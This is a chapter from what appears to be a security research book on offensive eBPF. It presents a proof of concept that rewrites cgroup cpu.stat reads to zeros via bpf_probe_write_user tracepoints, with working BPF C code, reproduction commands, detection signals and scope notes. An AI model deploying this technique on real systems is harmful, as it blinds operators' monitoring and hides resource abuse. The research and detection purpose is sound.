---
layout: book
title: "Chapter 5: Slipping the Cgroup Leash"
date: 2025-02-05
---

# Chapter 5: Slipping the Cgroup Leash

> **See also**: [Blog post]({{ site.baseurl }}/slipping-the-cgroup-leash.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch05-cgroup-leash) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Proof status**: `ch05-cgroup-leash` has been proved on Ubuntu 6.17.0 aarch64 (Lima VM, kernel 6.17.0-29-generic). No code changes were required.

The target here is not the cgroup enforcement path. It is the readback path. The scheduler keeps accounting CPU correctly and keeps throttling the cgroup if it exceeds its quota. What changes is what `cat /sys/fs/cgroup/cpu.stat` returns to the reader.

The POC waits for a process to open `cpu.stat`, waits for the subsequent `read()` to complete, then overwrites the returned bytes in userspace memory with a constant string of zeros before the reader's `read()` returns. The kernel read path ran. The scheduler provided the real numbers. Those bytes were copied to the user buffer. Between that copy and the reader regaining control, a BPF program running in the `sys_exit_read` tracepoint overwrote the user buffer.

The reader sees `usage_usec 0`. Any tool that opens `cpu.stat` fresh on each poll — Prometheus node-exporter, Datadog, Netdata, cAdvisor, k8s metrics-server — would receive the zeroed buffer; this is an untested projection, not a verified observation, since the POC only confirmed the rewrite against `cat`. Tools that use inotify, persistent mmap, or kernel-side accounting bypasses may behave differently. The scheduler still throttles the cgroup. The observation plane and the control plane have been split.

Prior art on `cpu.stat` spoofing via BPF goes back to ~2021. The contribution here is a harness with clean BEFORE/AFTER and honest detection notes.

## Mechanism

Two syscall tracepoints do the work. The `sys_enter_read` tracepoint identifies reads of a file named `cpu.stat` and stashes the user buffer pointer. The `sys_exit_read` tracepoint uses that stashed pointer to overwrite the returned bytes after the kernel has successfully completed the read. The critical window — between kernel finishing the copy and userspace regaining control — is where `bpf_probe_write_user` operates.

```c
SEC("tracepoint/syscalls/sys_enter_read")
int tp_enter_read(struct trace_event_raw_sys_enter *ctx) {
    int fd = (int)ctx->args[0];
    char *ubuf = (void *)(unsigned long)ctx->args[1];
    size_t nbytes = (size_t)ctx->args[2];

    // resolve fd -> dentry -> basename
    struct task_struct *task = (void *)bpf_get_current_task();
    struct file *f = BPF_CORE_READ(task, files, fdt, fd[fd]);
    char name[32] = {};
    BPF_CORE_READ_STR_INTO(&name, f, f_path.dentry, d_name.name);

    // bounded compare against "cpu.stat"
    if (!streq_bounded(name, "cpu.stat", 8)) return 0;

    u64 id = bpf_get_current_pid_tgid();
    struct pending p = { .ubuf = ubuf, .nbytes = nbytes };
    bpf_map_update_elem(&inflight, &id, &p, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_read")
int tp_exit_read(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    struct pending *p = bpf_map_lookup_elem(&inflight, &id);
    if (!p) return 0;
    long ret = ctx->ret;
    if (ret <= 0) goto out;

    static const char zeros[] =
        "usage_usec 0\nuser_usec 0\nsystem_usec 0\n";
    long n = sizeof(zeros) - 1;
    if (n > ret) n = ret;
    bpf_probe_write_user(p->ubuf, zeros, n);

    struct evt e = { .pid = id >> 32, .patched = 1, .bytes = n };
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);
out:
    bpf_map_delete_elem(&inflight, &id);
    return 0;
}
```

Two verifier constraints shaped the implementation significantly. First, unbounded string comparison against `"cpu.stat"` is rejected; you have to `#pragma unroll` a bounded loop or use `streq_bounded` with a constant length. Second, the five-hop struct walk — `task → files_struct → fdtable → file* array → file → path → dentry → qstr → name bytes` — requires CO-RE for portability. `struct files_struct`, `fdtable`, `file`, and `dentry` have minor layout shifts across kernel versions; CO-RE adjusts at load time. Without it you would hardcode offsets and get silent data corruption on any kernel where the layout differs.

The filename comparison is basename-only. There is no check on the directory, filesystem type, or superblock magic. A file named `cpu.stat` anywhere on the system triggers the rewrite. A production version would add `f_path.mnt->mnt_sb->s_magic == CGROUP2_SUPER_MAGIC` (0x63677270) to eliminate false positives on non-cgroup filesystems. The POC omits this; false positives would be detectable noise in a real deployment.

## Hook points

- `tp/syscalls/sys_enter_read`; identify reads of `cpu.stat`, stash user buffer.
- `tp/syscalls/sys_exit_read`; overwrite user buffer on success.

## Reproduction

```bash
cd dBPF-pocs/pocs/ch05-cgroup-leash
make
sudo ./build/ch05-cgroup-leash &
# baseline
cat /sys/fs/cgroup/cpu.stat          # real usage
# loader running
cat /sys/fs/cgroup/cpu.stat          # zeros
# expect: === CH05_PROVEN before_usage=<N> after_usage=0 zeroed=yes ===
```

## Detection

- `bpf_probe_write_user` invocation triggers a `pr_warn_ratelimited` in dmesg at program load time: `<loader>[<pid>] is installing a program with bpf_probe_write_user helper that may corrupt user memory!` — one per loader process, not per invocation, not suppressible short of patching the kernel.
- On kernels older than ~5.13, loading this helper also set `TAINT_USER` (bit 6, value 64) in `/proc/sys/kernel/tainted`. That taint call was removed in later kernels. On 6.12 the taint word is not set; dmesg is the primary signal.
- `bpftool prog show | grep tracepoint`; a tracepoint on `sys_exit_read` with `bpf_probe_write_user` calls is an unusual fingerprint.
- Out-of-band cross-check: compute per-cgroup CPU usage from `/proc/schedstat` and per-task `/proc/[pid]/stat`, compare against `cpu.stat`. Any drift larger than a few hundred microseconds per second of wall time is suspicious.

## Scope

This is a Class II primitive from chapter 20 (userspace buffer rewrite). Anything gated on `cpu.stat` for metrics (Prometheus node-exporter, Datadog, Netdata, k8s metrics-server, Sysdig, systemd's own `systemctl status`) is affected. Anything consulting the scheduler directly is not. The same shape trivially extends to `memory.current`, `io.stat`, and `cpu.pressure`.

systemd deserves a specific note. When `CPUAccounting=yes` is set in a unit file, `systemctl status` opens `cpu.stat` fresh on each invocation and would receive the zeroed buffer — that path was confirmed by the POC. However, systemd's internal `CPUQuota=` enforcement accounting uses a private file descriptor opened at service start; whether that fd path is intercepted by the same tracepoint hook was not tested. The claim that systemd's policy decisions misfire silently is therefore not demonstrated. What the POC shows is that any caller that opens `cpu.stat` fresh (such as `systemctl status`) sees zeroes; systemd's internal enforcement path requires separate verification.

What makes this primitive worth understanding alongside Chapters 1 and 3 is what it reveals about defense posture. Chapter 1 breaks access control enforcement. Chapter 3 breaks audit confidentiality. This chapter breaks neither — it only breaks the monitoring layer, the tooling that operators use to observe whether their enforcement is working. That is a different kind of damage, and arguably a quieter one.
